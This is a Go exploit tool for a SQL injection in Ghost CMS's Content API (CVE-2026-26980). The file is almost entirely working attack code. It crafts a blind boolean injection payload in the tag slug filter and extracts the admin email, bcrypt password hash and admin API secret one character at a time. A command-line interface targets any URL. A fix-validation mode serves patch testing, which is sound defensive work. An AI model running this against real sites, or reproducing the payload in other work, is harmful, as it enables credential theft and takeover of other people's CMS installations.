package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"time"
)

// ═══════════════════════════════════════════════════════════════════════
// ASCII BANNER ART
// ═══════════════════════════════════════════════════════════════════════
const banner = `
 ██████╗██╗   ██╗███████╗     ██████╗███╗   ███╗███████╗     ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗
██╔════╝██║   ██║██╔════╝    ██╔════╝████╗ ████║██╔════╝    ██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝
██║     ██║   ██║█████╗      ██║     ██╔████╔██║███████╗    ██║  ███╗███████║██║   ██║███████╗   ██║   
██║     ╚██╗ ██╔╝██╔══╝      ██║     ██║╚██╔╝██║╚════██║    ██║   ██║██╔══██║██║   ██║╚════██║   ██║   
╚██████╗ ╚████╔╝ ███████╗    ╚██████╗██║ ╚═╝ ██║███████║    ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║   
 ╚═════╝  ╚═══╝  ╚══════╝     ╚═════╝╚═╝     ╚═╝╚══════╝     ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   

╔═══════════════════════════════════════════════╗
║  CVE-2026-26980 — Ghost CMS SQL Injection     ║
║  Content API slug filter ordering exploit     ║
╠═══════════════════════════════════════════════╣
║  Affected: Ghost 3.24.0 – 6.19.0              ║
║  Fixed:    Ghost 6.19.1                       ║
║  CVSS:     9.4 (Critical)                     ║
║  CWE:      CWE-89 (SQL Injection)             ║
║  Advisory: GHSA-w52v-v783-gw97                ║
╚═══════════════════════════════════════════════╝

Author: GhostGTR666 - Gagaltotal666
Github: https://github.com/gagaltotal/CVE-2026-26980-Ghost-CMS-Api
`

// ═══════════════════════════════════════════════════════════════════════
// CONSTANTS
// ═══════════════════════════════════════════════════════════════════════
const (
	AdminName     = "Ghost Admin"
	AdminEmail    = "admin@ghost-poc.local"
	AdminPassword = "Gh0stP0C2026!!"
	BlogTitle     = "CVE-2026-26980 PoC"
	DefaultURL    = "http://target.com:2368"
	WaitTimeout   = 180
	MaxLength     = 256
	MinChar       = 32
	MaxChar       = 126
)

// ═══════════════════════════════════════════════════════════════════════
// TYPES & STRUCTS
// ═══════════════════════════════════════════════════════════════════════
type SetupResponse struct {
	Setup []struct {
		Status bool `json:"status"`
	} `json:"setup"`
}

type IntegrationResponse struct {
	Integrations []struct {
		APIKeys []struct {
			Type   string `json:"type"`
			Secret string `json:"secret"`
		} `json:"api_keys"`
	} `json:"integrations"`
}

type TagsResponse struct {
	Tags []struct {
		Slug string `json:"slug"`
	} `json:"tags"`
}

type ExploitResult struct {
	TargetURL    string
	ContentKey   string
	AdminEmail   string
	PasswordHash string
	APISecret    string
}

type GhostSQLiExploit struct {
	BaseURL    string
	Verbose    bool
	Key        string
	Slug       string
	HTTPClient *http.Client
	Jar        http.CookieJar
}

// ═══════════════════════════════════════════════════════════════════════
// CONSTRUCTOR
// ═══════════════════════════════════════════════════════════════════════
func NewGhostSQLiExploit(baseURL string, verbose bool) *GhostSQLiExploit {
	jar, _ := NewCookieJar()
	return &GhostSQLiExploit{
		BaseURL: strings.TrimRight(baseURL, "/"),
		Verbose: verbose,
		HTTPClient: &http.Client{
			Timeout: 30 * time.Second,
			Jar:     jar,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		},
		Jar: jar,
	}
}

// ═══════════════════════════════════════════════════════════════════════
// COOKIE JAR IMPLEMENTATION (simple in-memory)
// ═══════════════════════════════════════════════════════════════════════
type CookieJar struct {
	cookies map[string][]*http.Cookie
}

func NewCookieJar() (*CookieJar, error) {
	return &CookieJar{
		cookies: make(map[string][]*http.Cookie),
	}, nil
}

func (j *CookieJar) SetCookies(u *url.URL, cookies []*http.Cookie) {
	host := u.Hostname()
	j.cookies[host] = append(j.cookies[host], cookies...)
}

func (j *CookieJar) Cookies(u *url.URL) []*http.Cookie {
	return j.cookies[u.Hostname()]
}

// ═══════════════════════════════════════════════════════════════════════
// HELPER FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════
func flushPrint(format string, args ...interface{}) {
	fmt.Printf(format, args...)
	os.Stdout.Sync()
}

func (e *GhostSQLiExploit) log(msg string) {
	if e.Verbose {
		fmt.Printf("    [DBG] %s\n", msg)
	}
}

func (e *GhostSQLiExploit) logf(format string, args ...interface{}) {
	if e.Verbose {
		fmt.Printf("    [DBG] "+format+"\n", args...)
	}
}

func readResponseBody(resp *http.Response) ([]byte, error) {
	if resp == nil {
		return nil, fmt.Errorf("nil response")
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read body: %w", err)
	}
	return body, nil
}

func safeClose(resp *http.Response) {
	if resp != nil && resp.Body != nil {
		_ = resp.Body.Close()
	}
}

func truncateString(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen] + "..."
}

// ═══════════════════════════════════════════════════════════════════════
// HTTP REQUEST METHODS
// ═══════════════════════════════════════════════════════════════════════
func (e *GhostSQLiExploit) doRequest(method, path string, body interface{}) (*http.Response, error) {
	var bodyReader io.Reader
	if body != nil {
		jsonBody, err := json.Marshal(body)
		if err != nil {
			return nil, fmt.Errorf("failed to marshal body: %w", err)
		}
		bodyReader = bytes.NewReader(jsonBody)
	}

	fullURL := e.BaseURL + path
	req, err := http.NewRequest(method, fullURL, bodyReader)
	if err != nil {
		return nil, fmt.Errorf("failed to create request: %w", err)
	}

	req.Header.Set("Accept", "application/json")
	if body != nil {
		req.Header.Set("Content-Type", "application/json")
	}
	req.Header.Set("Origin", e.BaseURL)
	req.Header.Set("Referer", e.BaseURL+"/ghost/")
	req.Header.Set("User-Agent", "Ghost-PoC/1.0")

	e.logf("REQ: %s %s", method, fullURL)

	resp, err := e.HTTPClient.Do(req)
	if err != nil {
		return nil, fmt.Errorf("request failed: %w", err)
	}

	e.logf("RESP: %d", resp.StatusCode)
	return resp, nil
}

func (e *GhostSQLiExploit) contentGet(path string, params map[string]string) (*http.Response, error) {
	fullURL := e.BaseURL + "/ghost/api/content/" + path

	u, err := url.Parse(fullURL)
	if err != nil {
		return nil, fmt.Errorf("failed to parse URL: %w", err)
	}

	q := u.Query()
	if e.Key != "" {
		q.Set("key", e.Key)
	}
	for k, v := range params {
		q.Set(k, v)
	}
	u.RawQuery = q.Encode()

	req, err := http.NewRequest("GET", u.String(), nil)
	if err != nil {
		return nil, fmt.Errorf("failed to create request: %w", err)
	}

	req.Header.Set("Accept", "application/json")
	req.Header.Set("Origin", e.BaseURL)
	req.Header.Set("Referer", e.BaseURL+"/ghost/")
	req.Header.Set("User-Agent", "Ghost-PoC/1.0")

	e.logf("CONTENT GET: %s", u.String())

	resp, err := e.HTTPClient.Do(req)
	if err != nil {
		return nil, fmt.Errorf("content request failed: %w", err)
	}

	e.logf("CONTENT RESP: %d", resp.StatusCode)
	return resp, nil
}

// ═══════════════════════════════════════════════════════════════════════
// PHASE 0: RECONNAISSANCE & SETUP
// ═══════════════════════════════════════════════════════════════════════
func (e *GhostSQLiExploit) Wait() bool {
	flushPrint("[*] Waiting for Ghost at %s", e.BaseURL)

	shortClient := &http.Client{Timeout: 5 * time.Second}
	t0 := time.Now()

	for time.Since(t0) < time.Duration(WaitTimeout)*time.Second {
		req, err := http.NewRequest(
			"GET",
			e.BaseURL+"/ghost/api/admin/authentication/setup/",
			nil,
		)
		if err == nil {
			resp, err := shortClient.Do(req)
			if err == nil {
				safeClose(resp)
				if resp.StatusCode == 200 || resp.StatusCode == 403 {
					fmt.Println(" ready")
					return true
				}
			}
		}
		flushPrint(".")
		time.Sleep(3 * time.Second)
	}
	fmt.Println(" TIMEOUT")
	return false
}

func (e *GhostSQLiExploit) Setup() bool {
	fmt.Printf("[*] Setting up Ghost (admin: %s)\n", AdminEmail)

	resp, err := e.doRequest("GET", "/ghost/api/admin/authentication/setup/", nil)
	if err != nil {
		e.logf("Setup check error: %v", err)
		return false
	}

	alreadySetup := false
	switch resp.StatusCode {
	case 403:
		alreadySetup = true
		safeClose(resp)
	case 200:
		body, err := readResponseBody(resp)
		if err == nil {
			var setupResp SetupResponse
			if json.Unmarshal(body, &setupResp) == nil {
				if len(setupResp.Setup) > 0 && setupResp.Setup[0].Status {
					alreadySetup = true
				}
			}
		}
	}

	if alreadySetup {
		fmt.Println("[*] Already set up — logging in")
		return e.login()
	}

	setupBody := map[string]interface{}{
		"setup": []map[string]string{
			{
				"name":      AdminName,
				"email":     AdminEmail,
				"password":  AdminPassword,
				"blogTitle": BlogTitle,
			},
		},
	}

	resp, err = e.doRequest("POST", "/ghost/api/admin/authentication/setup/", setupBody)
	if err != nil {
		e.logf("Setup error: %v", err)
		return false
	}
	safeClose(resp)

	if resp.StatusCode == 200 || resp.StatusCode == 201 {
		fmt.Println("[+] Setup complete — establishing session")
		return e.login()
	}

	fmt.Printf("[!] Setup failed: %d\n", resp.StatusCode)
	return false
}

func (e *GhostSQLiExploit) login() bool {
	loginBody := map[string]string{
		"username": AdminEmail,
		"password": AdminPassword,
	}

	resp, err := e.doRequest("POST", "/ghost/api/admin/session/", loginBody)
	if err != nil {
		e.logf("Login error: %v", err)
		return false
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 || resp.StatusCode == 201 {
		fmt.Println("[+] Logged in")
		return true
	}

	fmt.Printf("[!] Login failed: %d\n", resp.StatusCode)
	return false
}

func (e *GhostSQLiExploit) GetContentKey() bool {
	if e.tryGetKeyFromIntegrations() {
		return true
	}

	if e.tryCreateIntegration() {
		return true
	}

	if e.scrapeKeyFromHTML() {
		return true
	}

	fmt.Println("[!] Could not get Content API key")
	return false
}

func (e *GhostSQLiExploit) tryGetKeyFromIntegrations() bool {
	resp, err := e.doRequest("GET", "/ghost/api/admin/integrations/?include=api_keys", nil)
	if err != nil || resp.StatusCode != 200 {
		safeClose(resp)
		return false
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return false
	}

	var intResp IntegrationResponse
	if json.Unmarshal(body, &intResp) != nil {
		return false
	}

	for _, integ := range intResp.Integrations {
		for _, k := range integ.APIKeys {
			if k.Type == "content" && k.Secret != "" {
				e.Key = k.Secret
				fmt.Printf("[+] Content API key: %s\n", e.Key)
				return true
			}
		}
	}
	return false
}

func (e *GhostSQLiExploit) tryCreateIntegration() bool {
	createBody := map[string]interface{}{
		"integrations": []map[string]string{
			{"name": "PoC"},
		},
	}

	resp, err := e.doRequest("POST", "/ghost/api/admin/integrations/", createBody)
	if err != nil || (resp.StatusCode != 200 && resp.StatusCode != 201) {
		safeClose(resp)
		return false
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return false
	}

	var intResp IntegrationResponse
	if json.Unmarshal(body, &intResp) != nil {
		return false
	}

	if len(intResp.Integrations) > 0 {
		for _, k := range intResp.Integrations[0].APIKeys {
			if k.Type == "content" && k.Secret != "" {
				e.Key = k.Secret
				fmt.Printf("[+] Content API key: %s\n", e.Key)
				return true
			}
		}
	}
	return false
}

func (e *GhostSQLiExploit) scrapeKeyFromHTML() bool {
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Get(e.BaseURL)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return false
	}

	re := regexp.MustCompile(`data-key="([a-f0-9]{20,})"`)
	matches := re.FindStringSubmatch(string(body))
	if len(matches) > 1 && matches[1] != "" {
		e.Key = matches[1]
		fmt.Printf("[+] Content API key (from HTML): %s\n", e.Key)
		return true
	}

	re2 := regexp.MustCompile(`"contentApiKey":"([a-f0-9]{20,})"`)
	matches2 := re2.FindStringSubmatch(string(body))
	if len(matches2) > 1 && matches2[1] != "" {
		e.Key = matches2[1]
		fmt.Printf("[+] Content API key (from HTML alt): %s\n", e.Key)
		return true
	}

	return false
}

func (e *GhostSQLiExploit) EnumerateSlug() bool {
	params := map[string]string{
		"filter": "slug:-null",
		"limit":  "1",
	}

	resp, err := e.contentGet("tags/", params)
	if err != nil {
		e.logf("Enumerate slug error: %v", err)
		return false
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		body, err := io.ReadAll(resp.Body)
		if err == nil {
			var tagsResp TagsResponse
			if json.Unmarshal(body, &tagsResp) == nil {
				if len(tagsResp.Tags) > 0 && tagsResp.Tags[0].Slug != "" {
					e.Slug = tagsResp.Tags[0].Slug
					fmt.Printf("[+] Anchor slug: %s\n", e.Slug)
					return true
				}
			}
		}
	}

	fmt.Println("[!] No public tags found — injection still works but cannot return rows")
	return false
}

// ═══════════════════════════════════════════════════════════════════════
// PHASE 1: SQL INJECTION VERIFICATION
// ═══════════════════════════════════════════════════════════════════════
func (e *GhostSQLiExploit) sqliFilter(condition string) string {
	payload := fmt.Sprintf("'||CASE WHEN %s THEN 0 ELSE EXP(710) END||'", condition)

	slug := e.Slug
	if slug == "" {
		slug = "news"
	}

	return fmt.Sprintf("slug:[%s,%s]", payload, slug)
}

func (e *GhostSQLiExploit) Oracle(condition string) bool {
	filt := e.sqliFilter(condition)
	params := map[string]string{"filter": filt}

	resp, err := e.contentGet("tags/", params)
	if err != nil {
		e.logf("Oracle error: %v", err)
		return false
	}
	defer resp.Body.Close()

	debugCond := condition
	if len(debugCond) > 60 {
		debugCond = debugCond[:60] + "..."
	}
	e.logf("oracle(%s) → %d", debugCond, resp.StatusCode)

	return resp.StatusCode == 200
}

func (e *GhostSQLiExploit) Verify() bool {
	fmt.Println("\n[*] Phase 1 — boolean blind verification")

	okTrue := e.Oracle("1=1")
	if okTrue {
		fmt.Println("  CASE WHEN 1=1:  200 (TRUE)")
	} else {
		fmt.Println("  CASE WHEN 1=1:  500 (unexpected)")
	}

	okFalse := !e.Oracle("1=0")
	if okFalse {
		fmt.Println("  CASE WHEN 1=0:  500 (FALSE)")
	} else {
		fmt.Println("  CASE WHEN 1=0:  200 (unexpected)")
	}

	if okTrue && okFalse {
		fmt.Println("  [+] Boolean oracle confirmed — VULNERABLE")
		return true
	}

	fmt.Println("  [-] Oracle not working — target may be patched")
	return false
}

// ═══════════════════════════════════════════════════════════════════════
// PHASE 2: DATA EXTRACTION
// ═══════════════════════════════════════════════════════════════════════
func (e *GhostSQLiExploit) extractLength(query string) int {
	lo, hi := 0, MaxLength
	for lo < hi {
		mid := (lo + hi) / 2
		cond := fmt.Sprintf("CHAR_LENGTH((%s)) > %d", query, mid)
		if e.Oracle(cond) {
			lo = mid + 1
		} else {
			hi = mid
		}
	}
	return lo
}

func (e *GhostSQLiExploit) extractChar(query string, pos int) byte {
	lo, hi := MinChar, MaxChar
	for lo < hi {
		mid := (lo + hi) / 2
		cond := fmt.Sprintf("ORD(SUBSTR((%s) FROM %d FOR 1)) > %d", query, pos, mid)
		if e.Oracle(cond) {
			lo = mid + 1
		} else {
			hi = mid
		}
	}
	if lo >= MinChar && lo <= MaxChar {
		return byte(lo)
	}
	return '?'
}

func (e *GhostSQLiExploit) Extract(query, label string) string {
	flushPrint("  Measuring length of %s... ", label)
	length := e.extractLength(query)
	fmt.Printf("%d chars\n", length)

	if length == 0 {
		return ""
	}

	var result strings.Builder
	result.Grow(length)

	flushPrint("  Extracting: ")
	for pos := 1; pos <= length; pos++ {
		ch := e.extractChar(query, pos)
		result.WriteByte(ch)
		flushPrint("%c", ch)
	}
	fmt.Println()

	return result.String()
}

func (e *GhostSQLiExploit) ExtractAdminEmail() string {
	fmt.Println("\n[*] Phase 2a — extracting admin email")
	query := "SELECT email FROM users ORDER BY id ASC LIMIT 1"
	email := e.Extract(query, "admin email")
	fmt.Printf("  [+] Email: %s\n", email)
	return email
}

func (e *GhostSQLiExploit) ExtractPasswordHash() string {
	fmt.Println("\n[*] Phase 2b — extracting admin bcrypt hash")
	query := "SELECT password FROM users ORDER BY id ASC LIMIT 1"
	h := e.Extract(query, "password hash")
	fmt.Printf("  [+] Hash:  %s\n", h)
	return h
}

func (e *GhostSQLiExploit) ExtractAdminAPISecret() string {
	fmt.Println("\n[*] Phase 2c — extracting admin API key")
	query := "SELECT secret FROM api_keys WHERE type='admin' ORDER BY id ASC LIMIT 1"
	s := e.Extract(query, "admin API secret")
	fmt.Printf("  [+] Secret: %s\n", s)
	return s
}

// ═══════════════════════════════════════════════════════════════════════
// MAIN EXPLOIT FLOWS
// ═══════════════════════════════════════════════════════════════════════
func (e *GhostSQLiExploit) Run(doPassword, doAPIKey bool) (*ExploitResult, error) {
	separator := strings.Repeat("=", 60)
	fmt.Println(separator)
	fmt.Println("CVE-2026-26980 — Ghost CMS Content API SQL Injection")
	fmt.Println(separator)
	fmt.Println()

	if !e.Wait() {
		return nil, fmt.Errorf("Ghost not available")
	}
	if !e.Setup() {
		return nil, fmt.Errorf("setup failed")
	}
	if !e.GetContentKey() {
		return nil, fmt.Errorf("could not get content key")
	}
	e.EnumerateSlug()

	if !e.Verify() {
		return nil, fmt.Errorf("target not vulnerable")
	}

	result := &ExploitResult{
		TargetURL:  e.BaseURL,
		ContentKey: e.Key,
	}

	result.AdminEmail = e.ExtractAdminEmail()

	if doPassword {
		result.PasswordHash = e.ExtractPasswordHash()
	}

	if doAPIKey {
		result.APISecret = e.ExtractAdminAPISecret()
	}

	fmt.Println()
	fmt.Println(separator)
	fmt.Println("  EXPLOITATION SUMMARY")
	fmt.Println(separator)
	fmt.Printf("  Target:        %s\n", result.TargetURL)
	fmt.Println("  CVE:           CVE-2026-26980")
	fmt.Printf("  Content key:   %s\n", result.ContentKey)
	fmt.Printf("  Admin email:   %s\n", result.AdminEmail)
	if result.PasswordHash != "" {
		fmt.Printf("  Pwd hash:      %s\n", truncateString(result.PasswordHash, 30))
	}
	if result.APISecret != "" {
		fmt.Printf("  Admin API key: %s\n", truncateString(result.APISecret, 30))
	}
	fmt.Println(separator)

	return result, nil
}

func (e *GhostSQLiExploit) ValidateFix() (bool, error) {
	separator := strings.Repeat("=", 60)
	fmt.Println(separator)
	fmt.Println("CVE-2026-26980 — Fix Validation")
	fmt.Println(separator)
	fmt.Println()

	if !e.Wait() {
		return false, fmt.Errorf("Ghost not available")
	}
	if !e.Setup() {
		return false, fmt.Errorf("setup failed")
	}
	if !e.GetContentKey() {
		return false, fmt.Errorf("could not get content key")
	}
	e.EnumerateSlug()

	if !e.Verify() {
		fmt.Println("\n[+] PASS — no SQL injection detected, fix is effective")
		return true, nil
	}

	fmt.Println("\n[!] FAIL — SQL injection still present!")
	return false, nil
}

// ═══════════════════════════════════════════════════════════════════════
// CLI FLAGS & MAIN
// ═══════════════════════════════════════════════════════════════════════
func printUsage() {
	usage := `
USAGE:
    ghost-sqli --url <URL> [OPTIONS]

REQUIRED:
    --url <URL>              Target Ghost CMS URL (REQUIRED)

OPTIONS:
    --validate-fix           Test that the target is NOT vulnerable
    --extract-password       Also extract admin bcrypt hash
    --extract-api-key        Also extract admin API secret
    --content-key <KEY>      Skip setup, use this Content API key directly
    -v, --verbose            Enable verbose/debug output
    -h, --help               Show this help message

EXAMPLES:
    # Basic exploitation (extract email only)
    ghost-sqli --url http://target:2368

    # Full extraction (email + password hash + API key)
    ghost-sqli --url http://target:2368 --extract-password --extract-api-key

    # Validate that a patched instance is fixed
    ghost-sqli --url http://target:2368 --validate-fix

    # Use existing content key (skip setup)
    ghost-sqli --url http://target:2368 --content-key "abc123def456..."

    # Verbose mode for debugging
    ghost-sqli --url http://target:2368 -v

`
	fmt.Print(usage)
}

func main() {
	fmt.Print(banner, "\n")

	targetURL := flag.String("url", "", "Target Ghost CMS URL (REQUIRED)")
	validateFix := flag.Bool("validate-fix", false, "Test that the target is NOT vulnerable")
	extractPassword := flag.Bool("extract-password", false, "Also extract admin bcrypt hash")
	extractAPIKey := flag.Bool("extract-api-key", false, "Also extract admin API secret")
	contentKey := flag.String("content-key", "", "Skip setup, use this Content API key directly")
	verbose := flag.Bool("v", false, "Verbose output")
	help := flag.Bool("help", false, "Show help message")

	flag.Usage = printUsage
	flag.Parse()

	if *help {
		printUsage()
		os.Exit(0)
	}

	if *targetURL == "" {
		fmt.Println("[!] Error: --url is required")
		fmt.Println("[!] Example: ghost-sqli --url http://target:2368")
		fmt.Println()
		printUsage()
		os.Exit(1)
	}

	exploit := NewGhostSQLiExploit(*targetURL, *verbose)

	if *contentKey != "" {
		exploit.Key = *contentKey
		fmt.Printf("[*] Using provided content key: %s\n", *contentKey)
	}

	var success bool
	var err error

	if *validateFix {
		success, err = exploit.ValidateFix()
	} else {
		_, err = exploit.Run(*extractPassword, *extractAPIKey)
		success = err == nil
	}

	if err != nil {
		fmt.Printf("\n[!] Error: %v\n", err)
	}

	if !success {
		os.Exit(1)
	}
}
